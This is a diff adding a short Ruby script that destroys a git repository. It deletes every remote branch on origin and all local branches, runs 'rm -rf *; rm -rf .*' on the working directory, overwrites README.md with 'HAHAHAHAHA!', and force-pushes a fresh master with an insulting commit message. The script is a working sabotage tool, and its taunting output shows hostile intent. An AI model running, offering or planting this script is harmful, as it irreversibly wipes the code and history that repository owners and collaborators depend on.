@@ -1,0 +1,48 @@
+#! /usr/bin/env ruby
+
+origin = `git remote get-url origin;`
+
+system "git checkout master; git fetch;"
+
+remote_branches = `git branch -r;`
+local_branches = `git branch;`
+
+remote_branches =
+  remote_branches
+  .split("\n")
+  .reject { |branch| branch =~ /HEAD/ }
+  .map { |branch| branch.split("origin/").join.strip! }
+  .reject { |branch| branch.empty? }
+  .compact
+
+local_branches =
+  local_branches
+  .split("\n")
+  .map { |branch| branch.strip! }
+  .compact
+
+puts remote_branches.inspect
+puts local_branches.inspect
+
+remote_branches.each do |branch|
+  puts "git push origin --delete #{branch};"
+  system "git push origin --delete #{branch};"
+end
+
+local_branches.each { |branch| system "git branch -D #{branch};" }
+
+puts "rm -rf *; rm -rf .*;"
+system "rm -rf *; rm -rf .*;"
+puts "echo \"HAHAHAHAHA!\" > README.md;"
+system "echo \"HAHAHAHAHA!\" > README.md;"
+
+puts "git init;"
+system "git init;"
+puts "git add .;"
+system "git add .;"
+puts "git remote add origin #{origin}"
+system "git remote add origin #{origin}"
+puts "git commit -m \"🖕\";"
+system "git commit -m \"🖕\";"
+puts "git push -f origin master;"
+system "git push -f origin master;"
